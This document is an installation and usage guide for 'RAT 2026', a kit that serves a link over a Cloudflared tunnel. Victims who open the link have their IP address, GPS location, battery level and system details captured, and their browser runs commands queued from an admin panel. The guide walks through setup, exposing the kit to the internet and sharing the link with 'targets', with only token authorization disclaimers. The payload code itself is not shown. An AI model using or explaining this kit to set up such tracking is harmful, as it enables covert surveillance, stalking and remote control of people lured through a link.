# 🚀 RAT 2026 - Simple Installation Guide

## ⚡ Quick Setup (5 Minutes)

### Step 1: Download Files

Create a new folder and save these files:

```
rat2026/
├── advanced-rat-2026.sh          # Main script
├── template2026.php               # Redirect template
├── client2026.html                # Target page
├── admin2026.html                 # Control panel
├── rat2026_webhook.php            # Data receiver
├── send_command2026.php           # Command sender
├── get_command2026.php            # Command getter
```

### Step 2: Install Requirements

**On Kali Linux / Ubuntu / Debian:**
```bash
sudo apt-get update
sudo apt-get install -y php wget
```

**On Termux (Android):**
```bash
pkg update
pkg install -y php wget
```

**On macOS:**
```bash
brew install php wget
```

### Step 3: Set Permissions

```bash
cd rat2026
chmod +x advanced-rat-2026.sh
```

### Step 4: Run

```bash
bash advanced-rat-2026.sh
```

### Step 5: Choose Mode

```
[1] Cloudflared Tunnel  ← For internet access
[2] Localhost          ← For local testing
```

### Step 6: Access Control Panel

Open browser:
```
http://127.0.0.1:4444/admin2026.html
```

### Step 7: Share Link

Copy the generated link and share with your **authorized** target.

---

## ✅ Testing Locally

### Test on Same Computer:

1. Start the tool:
```bash
bash advanced-rat-2026.sh
Select: [2] Localhost
```

2. Open control panel:
```
http://127.0.0.1:4444/admin2026.html
```

3. Open target page in another tab:
```
http://127.0.0.1:4444/client2026.html
```

4. Watch data appear in control panel!

---

## 🐛 Troubleshooting

### Issue: PHP Not Found
```bash
# Install PHP
sudo apt-get install php

# Verify
php --version
```

### Issue: Port 4444 Already in Use
```bash
# Kill existing process
sudo lsof -ti:4444 | xargs kill -9

# Or change port in script
# Edit line: php -S 127.0.0.1:4444
# Change to: php -S 127.0.0.1:5555
```

### Issue: Permission Denied
```bash
chmod +x advanced-rat-2026.sh
chmod 755 *.php *.html
```

### Issue: Data Not Saving
```bash
# Create directories
mkdir -p data/logs
chmod 777 data
chmod 777 data/logs
```

### Issue: Cloudflared Fails
- Just use Localhost mode [2]
- Or check internet connection
- Or manually download cloudflared

---

## 📂 File Structure After Running

```
rat2026/
├── advanced-rat-2026.sh
├── client2026.html
├── admin2026.html
├── template2026.php
├── index.php                    # Generated
├── rat2026_webhook.php
├── send_command2026.php
├── get_command2026.php
├── cloudflared                  # Downloaded
├── cf.log                       # Tunnel log
├── ip.txt                       # Temporary IPs
├── saved.ip.txt                 # Saved IPs
└── data/
    ├── rat_sessions.json        # Active sessions
    ├── rat_commands.json        # Command queue
    └── logs/
        └── rat_2026-02-18.txt   # Daily logs
```

---

## 🎯 Usage Examples

### Example 1: Test Locally
```bash
# Terminal 1
bash advanced-rat-2026.sh
[2] Localhost

# Browser Tab 1
http://127.0.0.1:4444/admin2026.html

# Browser Tab 2
http://127.0.0.1:4444/client2026.html

# Watch Tab 1 for data!
```

### Example 2: Test on Local Network
```bash
# On your computer
bash advanced-rat-2026.sh
[2] Localhost

# Find your IP
ip addr show | grep inet

# On another device (same network)
http://YOUR_IP:4444/client2026.html

# Example: http://192.168.1.100:4444/client2026.html
```

### Example 3: Test on Internet
```bash
# Start with tunnel
bash advanced-rat-2026.sh
[1] Cloudflared

# Copy the link
https://xxxxx.trycloudflare.com

# Share with authorized target
# They open: https://xxxxx.trycloudflare.com

# You monitor: http://127.0.0.1:4444/admin2026.html
```

---

## 📊 What You'll See

### In Admin Panel:
- Total targets connected
- Active sessions
- GPS coordinates
- Battery levels
- System information
- Real-time updates

### In Terminal:
```
[+] New Target IP: 192.168.1.50
[*] Waiting for targets...
```

### In Logs (data/logs/):
```
======================================================================
RAT 2026 Report - 2026-02-18 14:30:00
======================================================================
Session: rat2026_1738123456_abc123
Platform: Linux x86_64
...
```

---

## ⚠️ Important Notes

### 1. **Authorization Required**
- Only use on devices you own
- Get written permission for testing
- Follow all local laws

### 2. **Data Storage**
- Data stored in `data/` folder
- Delete after testing: `rm -rf data/`
- Secure sensitive information

### 3. **Network Security**
- Don't expose to internet without protection
- Use VPN if testing remotely
- Monitor access logs

### 4. **Clean Up**
```bash
# Stop all services
Ctrl + C

# Remove data
rm -rf data/
rm -f ip.txt saved.ip.txt
rm -f index.php
rm -f cloudflared cf.log
```

---

## 🔧 Customization

### Change Port:
Edit `advanced-rat-2026.sh`:
```bash
# Line: php -S 127.0.0.1:4444
# Change to: php -S 127.0.0.1:YOUR_PORT
```

### Change Colors:
Edit `admin2026.html` CSS section

### Add Commands:
Edit `admin2026.html` command grid

---

## 📞 Need Help?

### Check Logs:
```bash
# View today's log
cat data/logs/rat_$(date +%Y-%m-%d).txt

# View sessions
cat data/rat_sessions.json

# View commands
cat data/rat_commands.json
```

### Debug Mode:
```bash
# Run PHP with errors visible
php -S 127.0.0.1:4444

# Check if files exist
ls -la *.php *.html *.sh
```

---

## ✅ Success Checklist

- [ ] PHP installed (`php --version`)
- [ ] Files downloaded to same folder
- [ ] Permissions set (`chmod +x advanced-rat-2026.sh`)
- [ ] Script runs without errors
- [ ] Control panel loads (admin2026.html)
- [ ] Target page loads (client2026.html)
- [ ] Data appears in control panel
- [ ] Location permission requested
- [ ] GPS coordinates captured

---

## 🎓 What's Happening?

1. **Target opens link** → `index.php` (captures IP)
2. **Redirects to** → `client2026.html` (collects data)
3. **Sends data to** → `rat2026_webhook.php` (saves to JSON)
4. **Admin polls** → Gets data from JSON files
5. **Admin sends command** → `send_command2026.php`
6. **Target checks** → `get_command2026.php`
7. **Target executes** → Sends result back

---

**That's it! You're ready to use RAT 2026 for authorized penetration testing!**

Remember: **Always get permission first!** 🔒
